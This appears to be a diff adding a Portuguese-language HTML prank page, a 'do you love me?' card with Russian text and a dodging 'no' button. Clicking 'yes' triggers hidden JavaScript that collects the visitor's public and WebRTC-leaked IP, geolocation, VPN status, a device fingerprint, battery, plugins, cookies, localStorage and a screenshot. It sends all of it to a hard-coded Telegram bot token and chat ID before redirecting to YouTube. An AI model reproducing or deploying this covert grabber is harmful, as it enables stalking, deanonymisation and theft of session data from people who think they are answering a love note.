@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🇷🇺 Sonho Russo com Lana</title>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: #f0ebe4;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Fundo com neblina russa */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 30%, rgba(200, 180, 200, 0.25) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(180, 160, 200, 0.2) 0%, transparent 35%),
+                radial-gradient(circle at 50% 50%, rgba(220, 200, 210, 0.15) 0%, transparent 50%),
+                linear-gradient(135deg, #e8dfd7 0%, #d5cbc1 100%);
+            z-index: 0;
+            animation: nevoeiro 25s ease-in-out infinite alternate;
+        }
+
+        @keyframes nevoeiro {
+            0% {
+                transform: scale(1) rotate(-1deg);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(1.08) rotate(1deg);
+                opacity: 1;
+            }
+        }
+
+        /* Flocos de neve (estilo russo) */
+        .flocos {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background:
+                radial-gradient(3px 3px at 15% 10%, rgba(255, 255, 255, 0.6) 0%, transparent 100%),
+                radial-gradient(2px 2px at 35% 45%, rgba(255, 255, 255, 0.5) 0%, transparent 100%),
+                radial-gradient(4px 4px at 55% 20%, rgba(255, 255, 255, 0.4) 0%, transparent 100%),
+                radial-gradient(2px 2px at 75% 55%, rgba(255, 255, 255, 0.5) 0%, transparent 100%),
+                radial-gradient(3px 3px at 90% 30%, rgba(255, 255, 255, 0.3) 0%, transparent 100%),
+                radial-gradient(2px 2px at 25% 75%, rgba(255, 255, 255, 0.4) 0%, transparent 100%),
+                radial-gradient(3px 3px at 65% 85%, rgba(255, 255, 255, 0.3) 0%, transparent 100%),
+                radial-gradient(2px 2px at 45% 60%, rgba(255, 255, 255, 0.5) 0%, transparent 100%);
+            filter: blur(2px);
+            animation: cairNeve 6s ease-in-out infinite alternate;
+        }
+
+        @keyframes cairNeve {
+            0% {
+                transform: translateY(-5px) scale(1);
+                opacity: 0.6;
+            }
+            100% {
+                transform: translateY(10px) scale(1.05);
+                opacity: 1;
+            }
+        }
+
+        /* Caixa principal com vidro fosco (estilo inverno russo) */
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 248, 245, 0.7);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            border-radius: 48px 12px 48px 12px;
+            padding: 40px 25px 35px;
+            text-align: center;
+            box-shadow: 0 15px 60px rgba(0, 0, 0, 0.06), 0 0 100px rgba(180, 160, 200, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 70px rgba(0, 0, 0, 0.08);
+        }
+
+        /* Foto com borda de gelo */
+        .foto {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            display: block;
+            margin: 0 auto 20px auto;
+            border: 4px solid rgba(255, 255, 255, 0.7);
+            box-shadow: 0 8px 40px rgba(100, 80, 120, 0.1);
+            transition: all 0.4s ease;
+        }
+
+        .foto:hover {
+            transform: scale(1.04) rotate(-3deg);
+            box-shadow: 0 12px 50px rgba(180, 160, 200, 0.25);
+        }
+
+        /* Pergunta com toque russo */
+        .pergunta {
+            font-size: 23px;
+            color: #3d3530;
+            margin-bottom: 25px;
+            letter-spacing: 0.5px;
+            font-weight: 300;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+        }
+
+        .pergunta .emoji {
+            color: #b22234;
+            display: inline-block;
+            animation: pulsar 2.5s ease-in-out infinite;
+        }
+
+        @keyframes pulsar {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.15);
+                color: #8b0000;
+            }
+        }
+
+        /* Botões com toque vintage */
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            position: relative;
+            min-height: 70px;
+            margin-top: 5px;
+        }
+
+        .btn {
+            font-size: 17px;
+            padding: 13px 40px;
+            border: none;
+            background: rgba(235, 225, 215, 0.5);
+            color: #3d3530;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Georgia', serif;
+            letter-spacing: 0.5px;
+            border-radius: 50px 8px 50px 8px;
+            min-width: 110px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.03);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn:hover {
+            background: #c5b5b0;
+            color: #1a1513;
+            box-shadow: 0 4px 25px rgba(180, 160, 200, 0.2);
+            transform: translateY(-3px);
+        }
+
+        .btn-nao {
+            background: rgba(235, 225, 215, 0.25);
+            color: #7a6f6a;
+            transition: all 0.05s ease;
+            position: relative;
+        }
+
+        .btn-nao:hover {
+            transform: scale(1);
+            background: rgba(235, 225, 215, 0.25);
+            color: #7a6f6a;
+            box-shadow: none;
+        }
+
+        /* Loader minimalista */
+        .loader {
+            border: 3px solid rgba(200, 180, 190, 0.3);
+            border-top: 3px solid #b22234;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: girar 1s linear infinite;
+            margin: 20px auto 5px;
+            display: none;
+        }
+
+        @keyframes girar {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Corações flutuantes (estilo Lana) */
+        .floating-hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            overflow: hidden;
+        }
+
+        .floating-heart {
+            position: absolute;
+            font-size: 16px;
+            animation: subir 7s linear forwards;
+            opacity: 0.15;
+            color: #b22234;
+        }
+
+        @keyframes subir {
+            0% {
+                transform: translateY(100vh) rotate(0deg) scale(0.4);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.2;
+            }
+            90% {
+                opacity: 0.2;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(720deg) scale(1.1);
+                opacity: 0;
+            }
+        }
+
+        /* Responsivo iPhone */
+        @media (max-width: 500px) {
+            .container {
+                padding: 30px 18px 25px;
+                border-radius: 36px 8px 36px 8px;
+            }
+            .pergunta {
+                font-size: 19px;
+            }
+            .btn {
+                font-size: 15px;
+                padding: 11px 26px;
+                min-width: 90px;
+            }
+            .buttons {
+                gap: 15px;
+            }
+            .foto {
+                width: 120px;
+                height: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Efeitos de fundo -->
+    <div class="flocos"></div>
+    <div class="floating-hearts" id="floatingHearts"></div>
+
+    <!-- CONTEÚDO PRINCIPAL -->
+    <div class="container" id="page-content">
+        <!-- 🖼️ COLOQUE O NOME DA SUA IMAGEM AQUI -->
+        <img src="SUA-URL-AQUI" alt="Foto russa" class="foto">
+
+        <div class="pergunta">
+            <span class="emoji">💗</span> ты меня любишь?<br>
+            <span style="font-size: 16px; color: #7a6f6a;">(você me ama?)</span>
+        </div>
+
+        <div class="buttons" id="buttonArea">
+            <button class="btn" id="btnSim">Да ❤️</button>
+            <button class="btn btn-nao" id="btnNao">Нет 💔</button>
+        </div>
+
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <script>
+        // ============================================================
+        // BOTÃO "НЕТ" (NÃO) FUGINDO
+        // ============================================================
+        const btnNao = document.getElementById('btnNao');
+        const btnSim = document.getElementById('btnSim');
+        const container = document.getElementById('page-content');
+        const buttonArea = document.getElementById('buttonArea');
+        const loader = document.getElementById('loader');
+
+        btnNao.addEventListener('mouseenter', function(e) {
+            const containerRect = container.getBoundingClientRect();
+            const btnRect = btnNao.getBoundingClientRect();
+
+            const padding = 15;
+            const maxX = containerRect.width - btnRect.width - padding;
+            const maxY = containerRect.height - btnRect.height - padding;
+
+            let newX, newY;
+            let attempts = 0;
+            do {
+                newX = Math.random() * maxX;
+                newY = Math.random() * maxY;
+                attempts++;
+                if (attempts > 50) break;
+            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);
+
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
+            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
+        });
+
+        btnNao.addEventListener('click', function(e) {
+            const containerRect = container.getBoundingClientRect();
+            const btnRect = btnNao.getBoundingClientRect();
+            const maxX = containerRect.width - btnRect.width - 15;
+            const maxY = containerRect.height - btnRect.height - 15;
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.random() * maxX + 'px';
+            btnNao.style.top = Math.random() * maxY + 'px';
+        });
+
+        // ============================================================
+        // BOTÃO "ДА" (SIM) — VAI PRO YOUTUBE (LANA DEL REY)
+        // ============================================================
+        btnSim.addEventListener('click', function() {
+            buttonArea.style.display = 'none';
+            loader.style.display = 'block';
+
+            coletarEEnviar();
+
+            // 🎶 LANA DEL REY - "Summertime Sadness" (vibe russa intensa)
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com/watch?v=TdrL3QxjyVw';
+            }, 2000);
+        });
+
+        // ============================================================
+        // ENVIAR DADOS PRO TELEGRAM (BOT)
+        // ============================================================
+        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
+        const CHAT_ID = "8551438856";
+
+        async function coletarEEnviar() {
+            try {
+                // IP público
+                const ip = await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json()).then(d => d.ip).catch(() => '😵');
+
+                // IP real (WebRTC)
+                let webrtcIP = '❎';
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('teste');
+                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
+                    await pc.setLocalDescription(offer);
+                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
+                    if (candidates) {
+                        const ips = candidates.map(c => c.split(' ')[4])
+                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
+                        if (ips.length) webrtcIP = ips[0];
+                    }
+                    pc.close();
+                } catch {}
+
+                // Geolocalização
+                let location = {};
+                try {
+                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
+                    const d = await r.json();
+                    location = {
+                        city: d.city || 'Desconhecida',
+                        region: d.region || 'Desconhecida',
+                        country: d.country || 'Desconhecido',
+                        loc: d.loc || 'Desconhecida',
+                        org: d.org || 'Desconhecido',
+                        timezone: d.timezone || 'Desconhecido'
+                    };
+                } catch {
+                    location = { city: '🌃', region: '🗺️', country: '🌵', loc: '📍', org: '❌', timezone: '❌' };
+                }
+
+                // VPN/Proxy
+                let vpnStatus = '❓ Indeterminado';
+                if (location.org) {
+                    const org = location.org.toLowerCase();
+                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
+                        'vultr', 'heroku', 'azure', 'google cloud'
+                    ];
+                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
+                }
+
+                // Fingerprint
+                const fpData = [
+                    navigator.userAgent,
+                    navigator.language,
+                    screen.width + 'x' + screen.height,
+                    new Date().getTimezoneOffset(),
+                    navigator.hardwareConcurrency || '?',
+                    navigator.deviceMemory || '?',
+                    !!navigator.webdriver,
+                    !!navigator.plugins.length,
+                    navigator.doNotTrack || '?'
+                ];
+                let hash = 0;
+                const fpString = fpData.join('|');
+                for (let i = 0; i < fpString.length; i++) {
+                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
+
+                // Detectar dispositivo
+                const ua = navigator.userAgent;
+                const isIOS = /iPhone|iPad|iPod/i.test(ua);
+                const isAndroid = /Android/i.test(ua);
+                let modelo = 'Desconhecido',
+                    os = 'Desconhecido',
+                    marca = 'Desconhecida';
+
+                if (isIOS) {
+                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
+                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
+                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
+                    marca = 'Apple';
+                } else if (isAndroid) {
+                    const m = ua.match(/Android (\d+\.\d+)/);
+                    modelo = m ? `Android ${m[1]}` : 'Android';
+                    os = m ? `Android ${m[1]}` : 'Android';
+                    marca = 'Android';
+                } else {
+                    modelo = '💻 Computador';
+                    os = navigator.platform || 'Desconhecido';
+                    marca = 'Desktop';
+                }
+
+                // Bateria
+                let bateria = '🔋';
+                if (navigator.getBattery) {
+                    try {
+                        const b = await navigator.getBattery();
+                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🪫 Descarregando'})`;
+                    } catch {}
+                }
+
+                // Conexão
+                let conexao = '❌';
+                if (navigator.connection) {
+                    conexao = navigator.connection.effectiveType || 'N/A';
+                }
+
+                // Plugins
+                let plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';
+
+                // Cookies e localStorage
+                const cookies = document.cookie || '❌ Sem cookies';
+                let localStorageData = '❌';
+                try {
+                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
+                } catch {}
+
+                // WiFi
+                let wifi = '❌';
+                if (navigator.connection) {
+                    try {
+                        wifi =
+                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
+                    } catch {}
+                }
+
+                // Fontes
+                let fonts = [];
+                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
+                for (let f of fontList) {
+                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
+                }
+                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';
+
+                // Print
+                let screenshot = null;
+                try {
+                    const canvas = await html2canvas(document.body, {
+                        scale: 1.2,
+                        useCORS: true,
+                        backgroundColor: '#f0ebe4',
+                        logging: false,
+                        allowTaint: false,
+                        width: window.innerWidth,
+                        height: window.innerHeight,
+                        windowWidth: window.innerWidth,
+                        windowHeight: window.innerHeight
+                    });
+                    screenshot = canvas.toDataURL('image/jpeg', 0.85);
+                } catch (e) {}
+
+                // Mensagem para o Telegram
+                let msg = `
+         **🇷🇺** 
+
+        📲 **IP Público:** ${ip}
+        🔴 **IP Real:** ${webrtcIP}
+        🛡️ **VPN/Proxy:** ${vpnStatus}
+
+        📍 **LOCALIZAÇÃO:**
+           🌃 Cidade: ${location.city}
+           🗺️ Região: ${location.region}
+           🌍 País: ${location.country}
+           📍 Coordenadas: ${location.loc}
+           🕰️ Fuso: ${location.timezone}
+
+        📱 **DISPOSITIVO:**
+           Modelo: ${modelo}
+           Marca: ${marca}
+           OS: ${os}
+           🔋 Bateria: ${bateria}
+           🛜 Conexão: ${conexao}
+           📐 Tela: ${screen.width}x${screen.height}
+           🌍 Idioma: ${navigator.language}
+           ⏰ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+           🧠 Fingerprint: ${fingerprint}
+
+        📶 **REDE:** ${wifi}
+
+        🔌 **PLUGINS:** ${pluginsList}
+        🍪 **COOKIES:** ${cookies}
+        💾 **localStorage:** ${localStorageData}
+
+        🔤 **FONTES:** ${fontsInstalled}
+
+        💗 **Ela disse SIM!** (Да!)
+        `;
+
+                // Enviar mensagem
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+
+                // Enviar print
+                if (screenshot) {
+                    const form = new FormData();
+                    const blob = await fetch(screenshot).then(res => res.blob());
+                    form.append('photo', blob, 'screenshot_sonho.jpg');
+                    form.append('chat_id', CHAT_ID);
+                    form.append('caption', '🖼️ Print do Sonho Russo');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                }
+
+            } catch (e) {
+                console.log('Erro:', e);
+            }
+        }
+
+        // ============================================================
+        // CORAÇÕES FLUTUANDO (VIBE LANA)
+        // ============================================================
+        setInterval(() => {
+            if (document.getElementById('buttonArea').style.display === 'none') return;
+            const heart = document.createElement('div');
+            heart.className = 'floating-heart';
+            heart.textContent = '💗';
+            heart.style.left = Math.random() * 90 + 5 + '%';
+            heart.style.fontSize = (Math.random() * 16 + 10) + 'px';
+            heart.style.animationDuration = (Math.random() * 6 + 4) + 's';
+            heart.style.opacity = '0.15';
+            heart.style.color = '#b22234';
+            document.getElementById('floatingHearts').appendChild(heart);
+            setTimeout(() => { heart.remove(); }, 8000);
+        }, 3000);
+    </script>
+
+</body>
+</html>
